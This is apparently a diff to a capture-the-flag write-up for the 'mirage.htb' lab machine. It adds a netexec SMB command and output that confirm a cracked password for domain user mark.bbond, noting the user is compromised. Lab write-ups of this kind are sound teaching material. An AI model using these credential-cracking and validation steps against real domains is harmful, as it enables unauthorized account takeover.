@@ -649,6 +649,14 @@ MARK.BBOND::MIRAGE:e5e9025a2dc59132:51781a6c2c43dfd18c5e02823139aa87:01010000000
 
 The hash cracked
 
+```python
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u mark.bbond -p '1day@atime' -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime
+```
+
+This user is now compromised
+
 
 
 
